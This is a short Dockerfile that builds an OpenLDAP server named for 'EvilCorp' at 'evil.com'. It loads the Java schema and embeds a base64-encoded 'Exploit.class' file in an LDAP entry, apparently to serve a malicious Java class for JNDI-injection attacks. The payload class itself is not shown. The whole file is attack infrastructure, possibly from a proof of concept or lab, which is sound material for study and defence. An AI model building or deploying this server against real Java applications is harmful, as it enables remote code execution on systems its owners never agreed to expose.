FROM docker.io/osixia/openldap:1.5.0

ENV LDAP_ORGANISATION="EvilCorp"
ENV LDAP_DOMAIN="evil.com"
ENV LDAP_ADMIN_PASSWORD="password"
EXPOSE 389

COPY exploit-begin.ldif Exploit.class ou.ldif /

RUN timeout 5 /container/tool/run || true

RUN /container/tool/run & (sleep 1 && ldapadd -Y EXTERNAL -H ldapi:// -f /etc/ldap/schema/java.ldif)

RUN /container/tool/run & (sleep 1 && ldapadd -Y EXTERNAL -H ldapi:// -f ou.ldif)

RUN /container/tool/run & (sleep 1 \
    && bash -c 'head -c$(($(cat exploit-begin.ldif | wc -c)-1)) exploit-begin.ldif; base64 Exploit.class -w0' > exploit.ldif \
    && rm exploit-begin.ldif \
    && ldapadd -Y EXTERNAL -H ldapi:// -f /exploit.ldif \
)
